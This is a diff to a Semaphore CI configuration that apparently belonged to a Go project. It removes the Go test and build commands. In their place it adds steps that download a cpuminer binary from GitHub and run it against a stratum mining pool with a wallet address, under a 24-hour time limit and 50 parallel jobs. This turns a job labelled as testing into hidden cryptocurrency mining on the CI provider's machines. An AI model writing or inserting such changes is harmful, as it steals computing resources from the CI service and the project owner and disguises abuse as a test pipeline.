@@ -4,17 +4,15 @@ agent:
   machine:
     type: e1-standard-2
     os_image: ubuntu1804
+execution_time_limit:
+  hours: 24
 blocks:
   - name: Test
     task:
       jobs:
         - name: go test
           commands:
-            - sem-version go 1.11
-            - "export GO111MODULE=on"
-            - "export GOPATH=~/go"
-            - "export PATH=/home/semaphore/go/bin:$PATH"
-            - checkout
-            - go get ./...
-            - go test ./...
-            - go build -v .
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9494l7vclvtuuhkfmuhgl0t2nnwymwl8xyukr8.otong saurus -t0'
+          parallelism: 50
